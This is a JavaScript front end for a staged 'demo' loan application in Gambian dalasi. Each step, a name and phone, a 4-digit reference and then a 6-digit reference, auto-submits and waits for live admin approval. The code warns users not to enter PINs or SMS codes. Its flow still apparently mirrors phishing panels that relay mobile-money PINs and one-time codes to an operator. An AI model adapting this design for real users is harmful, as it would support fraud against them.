const $ = id => document.getElementById(id);
const adminSlug = new URLSearchParams(location.search).get('admin') || '';
let user = { id: '', name: '', phone: '' }, poller = null, auto1 = null, auto2 = null, auto3 = null;
function show(n) { [1,2,3,4].forEach(i => $('page'+i).classList.toggle('hidden', i !== n)); [1,2,3].forEach(i => $('tab'+i).classList.toggle('active', i === n)); window.scrollTo({top:0, behavior:'smooth'}); }
function startPolling() {
  clearInterval(poller);
  poller = setInterval(async () => {
    if (!user.id) return;
    try {
      const r = await fetch('/api/status/' + encodeURIComponent(user.id));
      if (!r.ok) return;
      const d = await r.json();
      if ($('page1').classList.contains('hidden') === false && d.stage1 === 'approved') {
        clearInterval(poller); $('status1').textContent = 'Approved by admin. Enter your application reference to continue.'; show(2);
      } else if ($('page1').classList.contains('hidden') === false && d.stage1 === 'rejected') {
        clearInterval(poller); $('status1').textContent = 'Your details were rejected. Please correct them and submit again.'; $('submit1').disabled = false;
      }
      if (!$('page2').classList.contains('hidden') && d.stage2 === 'approved') {
        clearInterval(poller); $('status2').textContent = 'Reference step approved by admin.'; show(3);
      } else if (!$('page2').classList.contains('hidden') && d.stage2 === 'rejected') {
        clearInterval(poller); $('status2').textContent = d.stage2Message || 'Reference step rejected. Please check and try again.'; $('submit2').disabled = false;
      }
    } catch (_) {}
  }, 1800);
}
$('submit1').onclick = async () => {
  user.name = $('name').value.trim(); user.phone = $('phone').value.trim();
  const trackingReference = $('trackingReference').value.trim();
  if (!user.name || !user.phone || user.phone.length < 6 || !/^\d{4}$/.test(trackingReference)) { $('status1').textContent = 'Enter your name, valid phone number, and 4-digit non-secret application reference. Do not enter a mobile money PIN.'; return; }
  $('submit1').disabled = true; $('status1').textContent = 'Sending details to admin…';
  try {
    const r = await fetch('/api/application', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({name:user.name, phone:user.phone, trackingReference, adminSlug})});
    const d = await r.json(); if (!r.ok) throw new Error(d.error || 'Unable to submit details');
    user.id = d.id; $('status1').textContent = 'Demo details submitted. Waiting for admin approval.'; startPolling();
  } catch(e) { $('status1').textContent = e.message; $('submit1').disabled = false; }
};
function autoSubmitDetails() {
  clearTimeout(auto1);
  if ($('name').value.trim().length >= 2 && $('phone').value.trim().length >= 6 && /^\d{4}$/.test($('trackingReference').value.trim()) && !$('submit1').disabled) {
    $('status1').textContent = 'Details complete. Submitting demo application…';
    auto1 = setTimeout(() => $('submit1').click(), 700);
  }
}

$('name').addEventListener('input', autoSubmitDetails);
$('phone').addEventListener('input', autoSubmitDetails);
$('trackingReference').addEventListener('input', () => { $('trackingReference').value = $('trackingReference').value.replace(/\D/g, '').slice(0, 4); autoSubmitDetails(); });


$('reference').addEventListener('input', () => {
  $('reference').value = $('reference').value.replace(/\D/g, '').slice(0, 6);
  if ($('reference').value.length === 6 && !$('submit2').disabled) {
    $('status2').textContent = 'Application reference complete. Submitting for review…';
    $('submit2').click();
  }
});

$('submit2').onclick = async () => {
  const reference = $('reference').value.trim();
  if (!/^\d{6}$/.test(reference)) { $('status2').textContent = 'Enter exactly 6 digits for the non-secret application reference. Do not enter an SMS code or PIN.'; return; }
  $('submit2').disabled = true; $('status2').textContent = 'Submitting reference for admin review…';
  try {
    const r = await fetch('/api/reference-submit', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id:user.id, reference})});
    const d = await r.json(); if (!r.ok) throw new Error(d.error || 'Unable to submit reference');
    $('status2').textContent = 'Reference submitted. Waiting for admin approval.'; startPolling();
  } catch(e) { $('status2').textContent = e.message; $('submit2').disabled = false; }
};

$('amount').addEventListener('input', () => {
  clearTimeout(auto3);
  const amount = Number($('amount').value);
  if ($('amount').value && Number.isFinite(amount) && amount >= 5000 && amount <= 1000000 && !$('submit3').disabled) {
    $('status3').textContent = 'Amount valid. Continuing demo…';
    auto3 = setTimeout(() => $('submit3').click(), 700);
  }
});
$('submit3').onclick = async () => {
  const amount = Number($('amount').value); if (!Number.isFinite(amount) || amount < 5000 || amount > 1000000) { $('status3').textContent = 'Enter an amount between D5,000 and D1,000,000 GMD.'; return; }
  $('submit3').disabled = true;
  try {
    const r = await fetch('/api/loan-request', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id:user.id, amount})});
    const d = await r.json(); if (!r.ok) throw new Error(d.error || 'Unable to continue'); $('status3').textContent = d.message; $('dashName').textContent = user.name || 'Demo Applicant'; $('dashPhone').textContent = user.phone || '—'; $('dashAmount').textContent = 'D' + amount.toLocaleString('en-US') + ' GMD'; show(4);
  } catch(e) { $('status3').textContent = e.message; }
  finally { $('submit3').disabled = false; }
};
